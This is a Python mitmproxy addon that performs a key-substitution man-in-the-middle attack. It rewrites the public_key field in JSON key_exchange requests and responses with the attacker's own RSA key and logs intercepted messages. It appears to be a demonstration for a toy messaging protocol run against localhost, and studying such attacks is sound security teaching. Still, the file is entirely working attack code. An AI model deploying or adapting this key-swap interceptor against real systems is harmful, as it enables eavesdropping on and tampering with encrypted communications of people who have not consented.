"""
mitm_addon.py
Role: mitmproxy addon script — professional MITM tool version of the key-swap attack.
Usage:
    mitmproxy -s mitm_addon.py --listen-port 8080 --mode reverse:http://127.0.0.1:9000

This addon intercepts HTTP(S) requests routed through mitmproxy.
When it detects a key_exchange JSON payload it replaces the public_key field
with MITM's own RSA public key — the same attack as mitm.py but using
the industry-standard mitmproxy framework.
"""

import json
import logging

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from crypto_utils import generate_rsa_keypair, serialize_public_key, key_fingerprint

# Generate MITM's RSA key pair once at import time
_mitm_priv, _mitm_pub = generate_rsa_keypair()
_mitm_pub_pem = serialize_public_key(_mitm_pub).decode()
_mitm_fp      = key_fingerprint(_mitm_pub)

logging.basicConfig(level=logging.INFO,
                    format="[mitm_addon] %(asctime)s %(message)s",
                    datefmt="%H:%M:%S")
log = logging.getLogger("mitm_addon")

log.info(f"MITM key fingerprint: {_mitm_fp}")


class KeySwapAddon:
    """
    mitmproxy addon that swaps RSA public keys in key_exchange messages.
    Hooks:
      request()  — called for every HTTP request before it reaches the server
      response() — called for every HTTP response before it reaches the client
    """

    def request(self, flow) -> None:
        """Intercept outgoing requests: swap key_exchange public keys."""
        try:
            body = flow.request.get_text()
            msg  = json.loads(body)
        except Exception:
            return   # not JSON — skip

        if msg.get("type") == "key_exchange":
            original_key = msg.get("public_key", "")[:40]
            msg["public_key"] = _mitm_pub_pem
            flow.request.set_text(json.dumps(msg))
            log.info(f"⚠ KEY SWAP (request)  sender={msg.get('sender')} "
                     f"original_prefix={original_key}…")

        elif msg.get("type") == "message":
            log.info(f"→ INTERCEPTED message from {msg.get('sender')} "
                     f"(ciphertext, cannot decrypt without session key here)")

    def response(self, flow) -> None:
        """Intercept server responses: swap key_exchange public keys on the return path."""
        try:
            body = flow.response.get_text()
            msg  = json.loads(body)
        except Exception:
            return

        if msg.get("type") == "key_exchange":
            msg["public_key"] = _mitm_pub_pem
            flow.response.set_text(json.dumps(msg))
            log.info(f"⚠ KEY SWAP (response) sender={msg.get('sender')}")


addons = [KeySwapAddon()]
